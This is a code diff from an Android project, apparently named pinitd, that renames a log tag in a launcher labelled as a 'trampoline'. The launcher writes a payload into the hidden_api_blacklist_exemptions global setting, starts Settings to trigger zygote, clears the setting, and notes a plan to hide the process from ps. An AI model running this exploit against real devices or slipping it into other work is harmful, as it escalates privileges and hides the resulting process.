@@ -10,14 +10,13 @@ import java.io.BufferedReader
 import java.io.InputStreamReader
 import kotlin.time.Duration.Companion.milliseconds
 
-const val TAG = "pinitd-trampoline"
 val EXEMPTIONS_SETTING_URI: Uri = Settings.Global.getUriFor("hidden_api_blacklist_exemptions")
 
 suspend fun launchPinitd(scope: CoroutineScope, context: Context) {
     // Path will end with "base.apk". Remove that and navigate to native library
     val basePath = context.packageCodePath.slice(0..context.packageCodePath.length-9)
     val binaryPath = basePath + "lib/arm64/libpinitd.so"
-    Log.w(TAG, "Attempting to launch: $binaryPath")
+    Log.w(SHARED_TAG, "Attempting to launch: $binaryPath")
     try {
         // Spawn logcat monitor
         val logcat = Logcat(scope)
@@ -34,41 +33,41 @@ suspend fun launchPinitd(scope: CoroutineScope, context: Context) {
         val settingsIntent = context.packageManager.getLaunchIntentForPackage("com.android.settings")
         settingsIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
 
-        Log.w(TAG, "Setting payload: $payload")
+        Log.w(SHARED_TAG, "Setting payload: $payload")
         Settings.Global.putString(context.contentResolver, "hidden_api_blacklist_exemptions", payload)
 
         // TODO: Add retries
-        Log.w(TAG, "Payload set")
+        Log.w(SHARED_TAG, "Payload set")
         startApp("Settings", context, settingsIntent)
 
         if (logcat.waitForSubstring("com.android.settings/1000 for top-activity {com.android.settings/com.android.settings.Settings", 1000.milliseconds)) {
-            Log.w(TAG, "Received settings launch log. Sending exemptions clear")
+            Log.w(SHARED_TAG, "Received settings launch log. Sending exemptions clear")
         } else {
-            Log.w(TAG, "Didn't receive settings launch log. Sending exemptions clear anyway")
+            Log.w(SHARED_TAG, "Didn't receive settings launch log. Sending exemptions clear anyway")
         }
 
         // TODO: Add success/failure check
         context.contentResolver.delete(EXEMPTIONS_SETTING_URI, null, null)
 
-        Log.w(TAG, "Trampoline complete")
+        Log.w(SHARED_TAG, "Trampoline complete")
 
         // TODO: Kill process after delay (to keep `ps` clean)
         Thread.sleep(500)
     } catch (e: Exception) {
-        Log.e(TAG, "Exploit error: ${e.message}")
+        Log.e(SHARED_TAG, "Exploit error: ${e.message}")
     }
 }
 
 fun startApp(name: String, context: Context, intent: Intent?) {
     try {
         if (intent != null) {
-            Log.w(TAG, "Starting $name")
+            Log.w(SHARED_TAG, "Starting $name")
             context.startActivity(intent)
-            Log.w(TAG, "Intent sent for $name")
+            Log.w(SHARED_TAG, "Intent sent for $name")
         } else {
-            Log.e(TAG, "Zygote trigger app not found")
+            Log.e(SHARED_TAG, "Zygote trigger app not found")
         }
     } catch (e: Exception) {
-        Log.e(TAG, "Zygote trigger app launch error: ${e.message}")
+        Log.e(SHARED_TAG, "Zygote trigger app launch error: ${e.message}")
     }
 }
